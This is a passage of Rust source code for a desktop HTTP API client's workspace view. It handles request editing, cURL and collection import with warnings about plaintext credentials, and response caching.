use crate::command_palette::CommandPaletteView;
use crate::kv_editor::{KvTable, render_kv_table};
use crate::response_view::{ResponseCacheEntry, ResponsePosition, UiSettings};
use crate::theme::{count_pill, svg_icon};
use crate::{
    CloseActiveTab, FocusSearch, FocusUrl, NewRequest, OpenCommandPalette, OpenImport,
    OpenVariables, SaveRequest, SendRequest, ToggleTheme,
};
use anyhow::{Context as _, Result};
use fastman_core::{
    ApiRequest, Auth, Collection, Folder, HttpBody, HttpEngine, Project, ProjectStore, Workspace,
    curl, import,
    security::{
        SensitiveFieldFinding, collect_sensitive_request_findings, sanitize_request_credentials,
        summarize_sensitive_findings,
    },
};
use gpui_kit::component::{
    ActiveTheme as _, IndexPath, Sizable as _, Theme, ThemeMode, WindowExt as _,
    alert::Alert,
    button::{Button, ButtonVariant, ButtonVariants as _},
    dialog::{DialogButtonProps, DialogEntrance},
    input::{
        EditorState, InlineToken, Input, InputContent, InputEvent, InputState, Textarea,
        TextareaState,
    },
    kbd::Kbd,
    menu::{DropdownMenu as _, PopupMenuItem},
    notification::Notification,
    resizable::{h_resizable, resizable_panel, v_resizable},
    select::{SearchableVec, SelectEvent, SelectItem, SelectState},
    tab::{Tab, TabBar},
};
use gpui_kit::prelude::FluentBuilder as _;
use gpui_kit::*;
use std::{
    cell::Cell,
    collections::{BTreeMap, HashMap, HashSet, VecDeque},
    sync::Arc,
};
use tokio::{runtime::Runtime, task::AbortHandle};

const MAX_CACHED_RESPONSES: usize = 16;
const MAX_TOTAL_CACHE_BYTES: usize = 24 * 1024 * 1024;

pub(super) const METHODS: &[&str] = &["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"];
pub(super) const AUTH_TYPES: &[&str] = &[
    "No Auth",
    "Basic Auth",
    "Bearer Token",
    "API Key (Header)",
    "API Key (Query)",
];
pub(super) const BODY_TYPES: &[&str] = &["None", "JSON", "Text", "Form URL Encoded"];

#[derive(Clone)]
pub(super) struct ProjectChoice {
    pub id: String,
    pub name: SharedString,
}

impl SelectItem for ProjectChoice {
    type Value = String;
    fn title(&self) -> SharedString {
        self.name.clone()
    }
    fn value(&self) -> &Self::Value {
        &self.id
    }
}

fn project_choices(projects: &[Project]) -> SearchableVec<ProjectChoice> {
    SearchableVec::new(
        projects
            .iter()
            .map(|project| ProjectChoice {
                id: project.id.clone(),
                name: project.name.clone().into(),
            })
            .collect::<Vec<_>>(),
    )
}

#[derive(Clone)]
pub(super) enum NameDialogKind {
    NewWorkspace,
    NewProject,
    RenameFolder(String),
    RenameCollection(String),
}

pub struct VariablesSheetView {
    table: KvTable,
}

impl VariablesSheetView {
    fn new(
        variables: &BTreeMap<String, String>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> Self {
        let mut table = KvTable::new("variable_name", "value", true);
        table.load_map(variables, window, cx, Self::on_table_change());
        Self { table }
    }

    fn on_table_change() -> impl Fn(&mut Self, &mut Window, &mut Context<Self>) + Clone + 'static {
        |view, window, cx| {
            view.table
                .ensure_trailing_blank(window, cx, Self::on_table_change());
            cx.notify();
        }
    }

    fn variables_map(&self, cx: &App) -> BTreeMap<String, String> {
        self.table.to_map(cx)
    }
}

impl Render for VariablesSheetView {
    fn render(&mut self, _window: &mut Window, cx: &mut Context<Self>) -> impl IntoElement {
        div()
            .size_full()
            .flex()
            .flex_col()
            .gap_3()
            .child(
                div()
                    .text_size(px(12.))
                    .text_color(cx.theme().muted_foreground)
                    .child("Use {{variable_name}} inside URLs, query params, headers, auth, or body payloads. Saved in plaintext project JSON—avoid storing real secrets here."),
            )
            .child(
                div()
                    .id("variables-sheet-scroll")
                    .flex_1()
                    .min_h_0()
                    .overflow_y_scroll()
                    .child(render_kv_table(
                        "project-vars",
                        &self.table,
                        cx,
                        |view, idx, cx| {
                            view.table.toggle_row(idx);
                            cx.notify();
                        },
                        |view, idx, window, cx| {
                            view.table
                                .remove_row(idx, window, cx, Self::on_table_change());
                            cx.notify();
                        },
                        |view, window, cx| {
                            view.table.add_row(window, cx, Self::on_table_change());
                            cx.notify();
                        },
                    )),
            )
    }
}

pub enum PendingSensitiveImport {
    Collection(import::ImportReport),
    Curl(curl::CurlParseReport, Vec<SensitiveFieldFinding>),
}

fn render_unsupported_curl_flags_alert(id: &'static str, flags: &[String]) -> Alert {
    Alert::warning(
        id,
        format!(
            "Ignored unsupported flag(s): {}. Fastman cannot emulate these options, so the imported HTTP method, headers, or body may differ from cURL.",
            flags.join(", ")
        ),
    )
    .title("Unsupported cURL Flags")
}

fn render_sensitive_choice_panel<V: 'static>(
    id_prefix: &'static str,
    source_label: &str,
    count: usize,
    summary: &str,
    choice: usize,
    on_select: impl Fn(&mut V, usize, &mut Context<V>) + 'static,
    cx: &mut Context<V>,
) -> Div {
    div()
        .flex()
        .flex_col()
        .gap_3()
        .child(
            Alert::warning(
                format!("{id_prefix}-warning"),
                format!(
                    "{source_label} contains {count} sensitive field(s): {summary}. Custom headers, query params, and URLs are persisted in plaintext project JSON, while Auth tab fields remain session-only."
                ),
            )
            .title("Plaintext Credential Risk"),
        )
        .child(
            TabBar::new(format!("{id_prefix}-choice"))
                .segmented()
                .small()
                .selected_index(choice)
                .on_click(cx.listener(move |view, idx, _, cx| {
                    on_select(view, *idx, cx);
                }))
                .child(Tab::new().label("Move / Strip Secrets (Safe)"))
                .child(Tab::new().label("Keep in Plaintext JSON")),
        )
        .child(
            div()
                .text_size(px(12.))
                .text_color(cx.theme().muted_foreground)
                .child(if choice == 0 {
                    "Recognized Bearer, Basic, and API key fields move to session-only Auth (not saved to disk); remaining cookies/custom secrets are stripped."
                } else {
                    "All imported headers, query params, and URLs will be saved in plaintext to project.json."
                }),
        )
}

pub struct CurlImportConfirmView {
    pub(super) report: curl::CurlParseReport,
    pub(super) replace_summary: Option<String>,
    pub(super) findings_count: usize,
    pub(super) findings_summary: String,
    pub(super) choice: usize,
}

impl Render for CurlImportConfirmView {
    fn render(&mut self, _window: &mut Window, cx: &mut Context<Self>) -> impl IntoElement {
        let mut root = div().flex().flex_col().gap_3();
        if let Some(replace_summary) = &self.replace_summary {
            root = root.child(
                Alert::warning("curl-paste-replace-warning", replace_summary.clone())
                    .title("Replace Current Request?"),
            );
        }
        if !self.report.unsupported_flags.is_empty() {
            root = root.child(render_unsupported_curl_flags_alert(
                "curl-paste-unsupported-flags",
                &self.report.unsupported_flags,
            ));
        }
        if self.findings_count > 0 {
            root = root.child(render_sensitive_choice_panel(
                "curl-paste-sensitive",
                "This cURL command",
                self.findings_count,
                &self.findings_summary,
                self.choice,
                |view, idx, cx| {
                    view.choice = idx;
                    cx.notify();
                },
                cx,
            ));
        }
        root
    }
}

pub struct ImportDialogView {
    pub mode: usize,
    pub input: Entity<TextareaState>,
    pub error: Option<String>,
    pub pending_sensitive: Option<PendingSensitiveImport>,
    pub sensitive_choice: usize,
}

impl ImportDialogView {
    fn new(window: &mut Window, cx: &mut Context<Self>) -> Self {
        let input = cx.new(|cx| {
            TextareaState::new(window, cx)
                .rows(10)
                .placeholder("Paste Collection v2.1 JSON...")
        });
        Self {
            mode: 0,
            input,
            error: None,
            pending_sensitive: None,
            sensitive_choice: 0,
        }
    }
}

impl Render for ImportDialogView {
    fn render(&mut self, _window: &mut Window, cx: &mut Context<Self>) -> impl IntoElement {
        if let Some(pending) = &self.pending_sensitive {
            match pending {
                PendingSensitiveImport::Collection(report) => {
                    return render_sensitive_choice_panel(
                        "sensitive-import",
                        "This collection",
                        report.sensitive_fields.len(),
                        &summarize_sensitive_findings(&report.sensitive_fields),
                        self.sensitive_choice,
                        |view, idx, cx| {
                            view.sensitive_choice = idx;
                            cx.notify();
                        },
                        cx,
                    )
                    .when_some(self.error.as_ref(), |el, err| {
                        el.child(Alert::error("import-error", err.clone()).title("Import failed"))
                    });
                }
                PendingSensitiveImport::Curl(report, findings) => {
                    return div()
                        .flex()
                        .flex_col()
                        .gap_3()
                        .when(!report.unsupported_flags.is_empty(), |el| {
                            el.child(render_unsupported_curl_flags_alert(
                                "import-curl-unsupported-flags",
                                &report.unsupported_flags,
                            ))
                        })
                        .when(!findings.is_empty(), |el| {
                            el.child(render_sensitive_choice_panel(
                                "sensitive-import",
                                "This cURL command",
                                findings.len(),
                                &summarize_sensitive_findings(findings),
                                self.sensitive_choice,
                                |view, idx, cx| {
                                    view.sensitive_choice = idx;
                                    cx.notify();
                                },
                                cx,
                            ))
                        })
                        .when_some(self.error.as_ref(), |el, err| {
                            el.child(
                                Alert::error("import-error", err.clone()).title("Import failed"),
                            )
                        });
                }
            }
        }

        let placeholder = if self.mode == 0 {
            "Paste Collection v2.1 JSON..."
        } else {
            "Paste a cURL command..."
        };
        div()
            .flex()
            .flex_col()
            .gap_3()
            .child(
                TabBar::new("import-mode")
                    .segmented()
                    .small()
                    .selected_index(self.mode)
                    .on_click(cx.listener(|view, idx, window, cx| {
                        view.mode = *idx;
                        view.error = None;
                        view.input.update(cx, |state, cx| {
                            state.set_placeholder(
                                if *idx == 0 {
                                    "Paste Collection v2.1 JSON..."
                                } else {
                                    "Paste a cURL command..."
                                },
                                window,
                                cx,
                            );
                        });
                        cx.notify();
                    }))
                    .child(Tab::new().label("Collection v2.1 JSON"))
                    .child(Tab::new().label("cURL Command")),
            )
            .child(
                div()
                    .text_size(px(12.))
                    .text_color(cx.theme().muted_foreground)
                    .child(if self.mode == 0 {
                        "Creates a new local project from the collection. Scripts stay inert; sensitive headers prompt before saving."
                    } else {
                        "Imports method, URL, query params, headers, auth, and body. Sensitive headers prompt before saving."
                    }),
            )
            .child(
                Textarea::new(&self.input)
                    .h(px(210.))
                    .font_family(cx.theme().mono_font_family.clone())
                    .text_size(px(12.))
                    .aria_label(placeholder),
            )
            .when_some(self.error.as_ref(), |el, err| {
                el.child(Alert::error("import-error", err.clone()).title("Import failed"))
            })
    }
}

/// Retained window state: project model + editor entities + request lifecycle.
pub struct WorkspaceView {
    pub(super) focus_handle: FocusHandle,
    pub(super) workspace_store: ProjectStore,
    pub(super) workspaces: Vec<Workspace>,
    pub(super) active_workspace: usize,
    pub(super) store: ProjectStore,
    pub(super) projects: Vec<Project>,
    pub(super) active_project: usize,
    pub(super) project_selector: Entity<SelectState<SearchableVec<ProjectChoice>>>,
    pub(super) explorer_search: Entity<InputState>,
    pub(super) editing_request_name: bool,
    pub(super) selected_id: Option<String>,
    pub(super) open_tabs: Vec<String>,
    pub(super) expanded: HashSet<String>,
    pub(super) target_folder: Option<String>,
    pub(super) dirty: bool,
    suppress_dirty: bool,
    pub(super) method: String,
    pub(super) body_kind: usize,
    pub(super) auth_kind: usize,
    pub(super) section: usize,
    pub(super) url: Entity<InputState>,
    pub(super) request_name: Entity<InputState>,
    pub(super) params_table: KvTable,
    pub(super) headers_table: KvTable,
    pub(super) form_table: KvTable,
    pub(super) body_editor: Entity<EditorState>,
    pub(super) timeout: Entity<InputState>,
    pub(super) auth_user: Entity<InputState>,
    pub(super) auth_password: Entity<InputState>,
    pub(super) auth_token: Entity<InputState>,
    pub(super) api_key_name: Entity<InputState>,
    pub(super) api_key_value: Entity<InputState>,
    pub(super) runtime: Arc<Runtime>,
    pub(super) engine: HttpEngine,
    pub(super) run_generation: u64,
    pub(super) in_flight_request_id: Option<String>,
    pub(super) pending_abort: Option<AbortHandle>,
    pub(super) pending: Option<Task<()>>,
    pub(super) responses: HashMap<String, ResponseCacheEntry>,
    pub(super) response_order: VecDeque<String>,
    pub(super) cached_request_count: usize,
    pub(super) params_active_count: usize,
    pub(super) headers_active_count: usize,
    pub(super) body_json_valid: bool,
    pub(super) last_url: String,
    pub(super) active_curl_confirm: Option<WeakEntity<CurlImportConfirmView>>,
    pub(super) active_command_palette: Option<WeakEntity<CommandPaletteView>>,
    pub(super) template_inspection: fastman_core::template::RequestTemplateInspection,
    pub(super) explorer_filter_lower: String,
    pub(super) response_tab: usize,
    pub(super) response_position: ResponsePosition,
    pub(super) response_raw: bool,
    pub(super) response_wrap: bool,
    pub(super) response_find_open: bool,
    pub(super) response_search: Entity<InputState>,
    pub(super) response_search_lower: String,
    pub(super) response_search_matches: usize,
    pub(super) response_scroll: UniformListScrollHandle,
    pub(super) headers_scroll: UniformListScrollHandle,
    pub(super) cookies_scroll: UniformListScrollHandle,
    pub(super) status: SharedString,
    pub(super) status_is_error: bool,
    _subscriptions: Vec<Subscription>,
}

impl WorkspaceView {
    pub fn new(window: &mut Window, cx: &mut Context<Self>) -> Result<Self> {
        Self::with_store(ProjectStore::system_default()?, window, cx)
    }

    fn with_store(
        store: ProjectStore,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> Result<Self> {
        let (workspaces, mut startup_warnings) = store.workspaces_resilient()?;
        let (mut projects, proj_warnings) = store.list_resilient()?;
        startup_warnings.extend(proj_warnings);
        if projects.is_empty() {
            projects.push(store.create("My API Project")?);
        }
        let first = projects[0].first_request_id();
        let project_selector = cx.new(|cx| {
            SelectState::new(
                project_choices(&projects),
                Some(IndexPath::default()),
                window,
                cx,
            )
        });
        let explorer_search =
            cx.new(|cx| InputState::new(window, cx).placeholder("Filter requests..."));
        let response_search =
            cx.new(|cx| InputState::new(window, cx).placeholder("Find in response..."));
        let url = cx.new(|cx| InputState::new(window, cx).placeholder("Request URL"));
        let request_name = cx.new(|cx| InputState::new(window, cx).placeholder("Request name"));
        let body_editor = cx.new(|cx| {
            EditorState::new(window, cx).placeholder("Enter JSON or raw request payload...")
        });
        let timeout = cx.new(|cx| InputState::new(window, cx));
        let auth_user = cx.new(|cx| InputState::new(window, cx).placeholder("Username"));
        let auth_password = cx.new(|cx| {
            InputState::new(window, cx)
                .placeholder("Password")
                .masked(true)
        });
        let auth_token = cx.new(|cx| {
            InputState::new(window, cx)
                .placeholder("Bearer token")
                .masked(true)
        });
        let api_key_name = cx.new(|cx| InputState::new(window, cx).placeholder("API key name"));
        let api_key_value = cx.new(|cx| {
            InputState::new(window, cx)
                .placeholder("API key value")
                .masked(true)
        });

        let mut subscriptions = Vec::new();
        subscriptions.push(cx.subscribe_in(
            &project_selector,
            window,
            |view, state, event, window, cx| {
                if matches!(event, SelectEvent::Confirm(_))
                    && let Some(id) = state.read(cx).selected_value().cloned()
                    && let Some(index) = view.projects.iter().position(|p| p.id == id)
                {
                    view.switch_project(index, window, cx);
                }
            },
        ));
        subscriptions.push(
            cx.subscribe_in(&explorer_search, window, |view, _, event, _, cx| {
                if matches!(event, InputEvent::Change) {
                    view.explorer_filter_lower = view
                        .explorer_search
                        .read(cx)
                        .value()
                        .trim()
                        .to_ascii_lowercase();
                    cx.notify();
                }
            }),
        );
        subscriptions.push(
            cx.subscribe_in(&response_search, window, |view, _, event, _, cx| {
                if matches!(event, InputEvent::Change) {
                    view.refresh_response_search_matches(cx);
                    cx.notify();
                }
            }),
        );
        subscriptions.push(cx.subscribe_in(
            &url,
            window,
            |view, _, event, window, cx| match event {
                InputEvent::PressEnter { .. } => view.send(Some(window), cx),
                InputEvent::Change if !view.suppress_dirty => {
                    let raw = view.url.read(cx).value().to_string();
                    let prior_url = std::mem::replace(&mut view.last_url, raw.clone());
                    let prev_started_curl = prior_url
                        .trim_start()
                        .to_ascii_lowercase()
                        .starts_with("curl");
                    if !prev_started_curl && curl::looks_like_curl_command(&raw) {
                        view.try_apply_curl_from_url_bar(&raw, prior_url, view.dirty, window, cx);
                    } else {
                        view.mark_dirty(cx);
                    }
                }
                _ => {}
            },
        ));
        subscriptions.push(
            cx.subscribe_in(
                &request_name,
                window,
                |view, _, event, window, cx| match event {
                    InputEvent::PressEnter { .. } if view.editing_request_name => {
                        view.toggle_rename_request(window, cx);
                    }
                    InputEvent::Change if !view.suppress_dirty => view.mark_dirty(cx),
                    _ => {}
                },
            ),
        );
        subscriptions.push(
            cx.subscribe_in(&body_editor, window, |view, _, event, _, cx| {
                if matches!(event, InputEvent::Change) && !view.suppress_dirty {
                    view.refresh_body_json_valid(cx);
                    view.mark_dirty(cx);
                }
            }),
        );
        for field in [
            &timeout,
            &auth_user,
            &auth_password,
            &auth_token,
            &api_key_name,
            &api_key_value,
        ] {
            subscriptions.push(cx.subscribe_in(field, window, |view, _, event, _, cx| {
                if matches!(event, InputEvent::Change) && !view.suppress_dirty {
                    view.mark_dirty(cx);
                }
            }));
        }

        let runtime = tokio::runtime::Builder::new_multi_thread()
            .worker_threads(2)
            .enable_all()
            .build()
            .context("Build networking runtime")?;
        let engine = HttpEngine::new().context("Build HTTP client")?;

        let ui_settings = UiSettings::load_from_root(store.root());

        let mut view = Self {
            focus_handle: cx.focus_handle(),
            workspace_store: store.clone(),
            workspaces,
            active_workspace: 0,
            store,
            projects,
            active_project: 0,
            project_selector,
            explorer_search,
            editing_request_name: false,
            selected_id: first.clone(),
            open_tabs: first.into_iter().collect(),
            expanded: HashSet::new(),
            target_folder: None,
            dirty: false,
            suppress_dirty: false,
            method: "GET".into(),
            body_kind: 0,
            auth_kind: 0,
            section: 0,
            url,
            request_name,
            params_table: KvTable::new("param", "value", true),
            headers_table: KvTable::new("Header-Name", "value", true),
            form_table: KvTable::new("field", "value", true),
            body_editor,
            timeout,
            auth_user,
            auth_password,
            auth_token,
            api_key_name,
            api_key_value,
            runtime: Arc::new(runtime),
            engine,
            run_generation: 0,
            in_flight_request_id: None,
            pending_abort: None,
            pending: None,
            responses: HashMap::new(),
            response_order: VecDeque::new(),
            cached_request_count: 0,
            params_active_count: 0,
            headers_active_count: 0,
            body_json_valid: true,
            last_url: String::new(),
            active_curl_confirm: None,
            active_command_palette: None,
            template_inspection: fastman_core::template::RequestTemplateInspection::default(),
            explorer_filter_lower: String::new(),
            response_tab: 0,
            response_position: ui_settings.response_position,
            response_raw: ui_settings.response_raw,
            response_wrap: ui_settings.response_wrap,
            response_find_open: false,
            response_search,
            response_search_lower: String::new(),
            response_search_matches: 0,
            response_scroll: UniformListScrollHandle::new(),
            headers_scroll: UniformListScrollHandle::new(),
            cookies_scroll: UniformListScrollHandle::new(),
            status: SharedString::new_static("Ready · local-first"),
            status_is_error: false,
            _subscriptions: subscriptions,
        };
        view.refresh_request_count();
        view.expand_all();
        view.load_editor(window, cx);
        view.focus_handle.focus(window, cx);
        if !startup_warnings.is_empty() {
            let summary = startup_warnings.join("; ");
            view.set_status(format!("Loaded with warnings: {summary}"), true, cx);
            window.push_notification(Notification::warning(summary), cx);
        }

        Ok(view)
    }

    pub(super) fn current(&self) -> &Project {
        &self.projects[self.active_project]
    }

    pub(super) fn current_request(&self) -> Option<&ApiRequest> {
        self.selected_id
            .as_deref()
            .and_then(|id| self.current().find_request(id))
    }

    pub(super) fn active_response_entry(&self) -> Option<&ResponseCacheEntry> {
        self.selected_id
            .as_deref()
            .and_then(|id| self.responses.get(id))
    }

    pub(super) fn mark_dirty(&mut self, cx: &mut Context<Self>) {
        if !self.dirty {
            self.dirty = true;
        }
        self.refresh_template_inspection(cx);
        cx.notify();
    }

    pub(super) fn refresh_template_inspection(&mut self, cx: &mut Context<Self>) {
        if self.selected_id.is_none() {
            self.template_inspection = fastman_core::template::RequestTemplateInspection::default();
            return;
        }
        let draft = self.snapshot_draft_request(cx);
        self.template_inspection =
            fastman_core::template::inspect_request(&draft, &self.current().variables);
        self.refresh_url_tokens(cx);
    }

    fn refresh_url_tokens(&mut self, cx: &mut Context<Self>) {
        let text = self.url.read(cx).value().to_string();
        let spans = fastman_core::template::find_resolved_spans(&text, &self.current().variables);
        let mut content = InputContent::new(text.clone());
        for span in spans {
            let raw = &text[span.range.clone()];
            let token = InlineToken::new(format!("var:{}", span.name), raw.to_owned());
            if let Ok(next) = content.clone().with_token(span.range, token) {
                content = next;
            }
        }
        self.url.update(cx, |input, cx| {
            let _ = input.set_tokens(content, cx);
        });
    }

    pub(super) fn refresh_request_count(&mut self) {
        self.cached_request_count = self.current().request_count();
    }

    pub(super) fn refresh_kv_counts(&mut self, cx: &App) {
        self.params_active_count = self.params_table.active_count(cx);
        self.headers_active_count = self.headers_table.active_count(cx);
    }

    pub(super) fn refresh_body_json_valid(&mut self, cx: &App) {
        if self.body_kind != 1 {
            self.body_json_valid = true;
            return;
        }
        let body_text = self.body_editor.read(cx).value().to_string();
        self.body_json_valid = body_text.trim().is_empty()
            || serde_json::from_str::<serde_json::Value>(&body_text).is_ok();
    }

    pub(super) fn refresh_response_search_matches(&mut self, cx: &App) {
        self.response_search_lower = self
            .response_search
            .read(cx)
            .value()
            .trim()
            .to_ascii_lowercase();
        if !self.response_find_open || self.response_search_lower.is_empty() {
            self.response_search_matches = 0;
            return;
        }
        let body = self
            .active_response_entry()
            .and_then(|entry| entry.response.as_ref())
            .map(|resp| {
                if !self.response_raw {
                    resp.pretty_body.as_ref().unwrap_or(&resp.raw_body)
                } else {
                    &resp.raw_body
                }
            });
        self.response_search_matches = body.map_or(0, |text| {
            crate::response_body_view::count_search_matches(
                text.as_ref(),
                &self.response_search_lower,
            )
        });
    }

    pub(super) fn reset_response_scroll(&self) {
        self.response_scroll.scroll_to_item(0, ScrollStrategy::Top);
        self.headers_scroll.scroll_to_item(0, ScrollStrategy::Top);
        self.cookies_scroll.scroll_to_item(0, ScrollStrategy::Top);
    }

    fn kv_change_handler(
        table_kind: usize,
    ) -> impl Fn(&mut Self, &mut Window, &mut Context<Self>) + Clone + 'static {
        move |view, window, cx| {
            if view.suppress_dirty {
                return;
            }
            match table_kind {
                0 => {
                    view.params_table
                        .ensure_trailing_blank(window, cx, Self::kv_change_handler(0))
                }
                1 => {
                    view.headers_table
                        .ensure_trailing_blank(window, cx, Self::kv_change_handler(1))
                }
                _ => view
                    .form_table
                    .ensure_trailing_blank(window, cx, Self::kv_change_handler(2)),
            }
            view.refresh_kv_counts(cx);
            view.mark_dirty(cx);
        }
    }

    pub(super) fn add_kv_row(
        &mut self,
        table_kind: usize,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        match table_kind {
            0 => self
                .params_table
                .add_row(window, cx, Self::kv_change_handler(0)),
            1 => self
                .headers_table
                .add_row(window, cx, Self::kv_change_handler(1)),
            _ => self
                .form_table
                .add_row(window, cx, Self::kv_change_handler(2)),
        }
        self.refresh_kv_counts(cx);
        cx.notify();
    }

    pub(super) fn remove_kv_row(
        &mut self,
        table_kind: usize,
        idx: usize,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        match table_kind {
            0 => self
                .params_table
                .remove_row(idx, window, cx, Self::kv_change_handler(0)),
            1 => self
                .headers_table
                .remove_row(idx, window, cx, Self::kv_change_handler(1)),
            _ => self
                .form_table
                .remove_row(idx, window, cx, Self::kv_change_handler(2)),
        }
        self.refresh_kv_counts(cx);
        self.mark_dirty(cx);
    }

    pub(super) fn append_header_preset(
        &mut self,
        key: &str,
        value: &str,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        self.headers_table
            .append_pair(key, value, window, cx, Self::kv_change_handler(1));
        self.refresh_kv_counts(cx);
        self.mark_dirty(cx);
    }

    pub(super) fn extract_url_query_params(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        let raw_url = self.url.read(cx).value().to_string();
        let Some((base, query)) = raw_url.split_once('?') else {
            return;
        };
        let query = query.split('#').next().unwrap_or(query);
        for part in query.split('&').filter(|s| !s.is_empty()) {
            let (k, v) = part.split_once('=').unwrap_or((part, ""));
            self.params_table
                .append_pair(k, v, window, cx, Self::kv_change_handler(0));
        }
        self.suppress_dirty = true;
        self.last_url = base.to_owned();
        Self::set_input(&self.url, base, window, cx);
        self.suppress_dirty = false;
        self.refresh_kv_counts(cx);
        self.mark_dirty(cx);
    }

    pub(super) fn format_body_json(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        let raw = self.body_editor.read(cx).value().to_string();
        if raw.trim().is_empty() {
            return;
        }
        match serde_json::from_str::<serde_json::Value>(&raw)
            .and_then(|val| serde_json::to_string_pretty(&val))
        {
            Ok(formatted) => {
                self.body_editor
                    .update(cx, |state, cx| state.set_value(formatted, window, cx));
                self.refresh_body_json_valid(cx);
                self.mark_dirty(cx);
            }
            Err(err) => {
                self.set_status(format!("JSON syntax error: {err}"), true, cx);
                window.push_notification(Notification::error(format!("Invalid JSON: {err}")), cx);
            }
        }
    }

    fn expand_all(&mut self) {
        fn expand_folders(items: &[Folder], expanded: &mut HashSet<String>) {
            for folder in items {
                expanded.insert(folder.id.clone());
                expand_folders(&folder.folders, expanded);
            }
        }
        self.expanded.clear();
        let collections = self.current().collections.clone();
        for collection in &collections {
            self.expanded.insert(collection.id.clone());
            expand_folders(&collection.folders, &mut self.expanded);
        }
    }

    fn set_input(
        state: &Entity<InputState>,
        value: impl Into<String>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let value = value.into();
        state.update(cx, |state, cx| state.set_value(value, window, cx));
    }

    fn set_editor(
        state: &Entity<EditorState>,
        value: impl Into<String>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let value = value.into();
        state.update(cx, |state, cx| state.set_value(value, window, cx));
    }

    pub(super) fn set_status(
        &mut self,
        message: impl Into<SharedString>,
        is_error: bool,
        cx: &mut Context<Self>,
    ) {
        self.status = message.into();
        self.status_is_error = is_error;
        cx.notify();
    }

    fn populate_editor_from_request(
        &mut self,
        request: ApiRequest,
        preserve_existing_name: bool,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        self.method = request.method;
        let current_name = self.request_name.read(cx).value().to_string();
        let keep_name = preserve_existing_name
            && !current_name.trim().is_empty()
            && current_name.trim() != "New Request";
        if !keep_name {
            Self::set_input(&self.request_name, request.name, window, cx);
        }
        self.last_url = request.url.clone();
        Self::set_input(&self.url, request.url, window, cx);
        self.params_table
            .load(&request.params, window, cx, Self::kv_change_handler(0));
        self.headers_table
            .load(&request.headers, window, cx, Self::kv_change_handler(1));
        match request.body {
            HttpBody::None => {
                self.body_kind = 0;
                Self::set_editor(&self.body_editor, "", window, cx);
                self.form_table
                    .load(&[], window, cx, Self::kv_change_handler(2));
            }
            HttpBody::Json(text) => {
                self.body_kind = 1;
                Self::set_editor(&self.body_editor, text, window, cx);
                self.form_table
                    .load(&[], window, cx, Self::kv_change_handler(2));
            }
            HttpBody::Text(text) => {
                self.body_kind = 2;
                Self::set_editor(&self.body_editor, text, window, cx);
                self.form_table
                    .load(&[], window, cx, Self::kv_change_handler(2));
            }
            HttpBody::FormUrlEncoded(pairs) => {
                self.body_kind = 3;
                Self::set_editor(&self.body_editor, "", window, cx);
                self.form_table
                    .load(&pairs, window, cx, Self::kv_change_handler(2));
            }
        };
        Self::set_input(&self.timeout, request.timeout_ms.to_string(), window, cx);
        self.auth_kind = match &request.auth {
            Auth::None => 0,
            Auth::Basic { .. } => 1,
            Auth::Bearer { .. } => 2,
            Auth::ApiKeyHeader { .. } => 3,
            Auth::ApiKeyQuery { .. } => 4,
        };
        for field in [
            &self.auth_user,
            &self.auth_password,
            &self.auth_token,
            &self.api_key_name,
            &self.api_key_value,
        ] {
            Self::set_input(field, "", window, cx);
        }
        match request.auth {
            Auth::Basic { username, password } => {
                Self::set_input(&self.auth_user, username, window, cx);
                Self::set_input(&self.auth_password, password, window, cx);
            }
            Auth::Bearer { token } => Self::set_input(&self.auth_token, token, window, cx),
            Auth::ApiKeyHeader { name, value } | Auth::ApiKeyQuery { name, value } => {
                Self::set_input(&self.api_key_name, name, window, cx);
                Self::set_input(&self.api_key_value, value, window, cx);
            }
            Auth::None => {}
        }
    }

    pub(super) fn parse_url_bar_curl(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        let raw = self.url.read(cx).value().to_string();
        let saved = self.current_request().cloned();
        let prior_url = saved.as_ref().map(|r| r.url.clone()).unwrap_or_default();
        let non_url_dirty = saved.as_ref().map_or_else(
            || {
                self.method != "GET"
                    || !self.params_table.to_key_values(cx).is_empty()
                    || !self.headers_table.to_key_values(cx).is_empty()
                    || self.body_kind != 0
                    || self.auth_kind != 0
                    || self.timeout.read(cx).value().trim() != "30000"
            },
            |req| self.non_url_draft_differs_from_saved(req, cx),
        );
        self.try_apply_curl_from_url_bar(&raw, prior_url, non_url_dirty, window, cx);
    }

    fn non_url_draft_differs_from_saved(&self, saved: &ApiRequest, cx: &App) -> bool {
        let snap = self.snapshot_draft_request(cx);
        snap.name != saved.name.trim()
            || snap.method != saved.method
            || snap.params != saved.params
            || snap.headers != saved.headers
            || snap.body != saved.body
            || snap.auth != saved.auth
            || self.timeout.read(cx).value().trim() != saved.timeout_ms.to_string()
    }

    fn restore_url_state(
        &mut self,
        prior_url: String,
        prior_dirty: bool,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        self.suppress_dirty = true;
        self.last_url = prior_url.clone();
        Self::set_input(&self.url, prior_url, window, cx);
        self.suppress_dirty = false;
        self.dirty = prior_dirty;
        self.refresh_template_inspection(cx);
        cx.notify();
    }

    fn describe_draft_replacement(
        &self,
        prior_url: &str,
        prior_dirty: bool,
        cx: &App,
    ) -> Option<String> {
        let mut items = Vec::new();
        if prior_dirty {
            items.push("unsaved edits");
        }
        if !prior_url.trim().is_empty() {
            items.push("URL");
        }
        if self.method != "GET" {
            items.push("method");
        }
        if !self.params_table.to_key_values(cx).is_empty() {
            items.push("query params");
        }
        if !self.headers_table.to_key_values(cx).is_empty() {
            items.push("headers");
        }
        if self.body_kind != 0 {
            items.push("body");
        }
        if self.auth_kind != 0 {
            items.push("auth");
        }
        if self.timeout.read(cx).value().trim() != "30000" {
            items.push("timeout");
        }
        (!items.is_empty()).then(|| {
            format!(
                "Applying this cURL command will overwrite your current request ({}).",
                items.join(", ")
            )
        })
    }

    fn apply_curl_request_to_editor(
        &mut self,
        parsed: ApiRequest,
        notice: Option<String>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        self.active_curl_confirm = None;
        let method = parsed.method.clone();
        let url = parsed.url.clone();
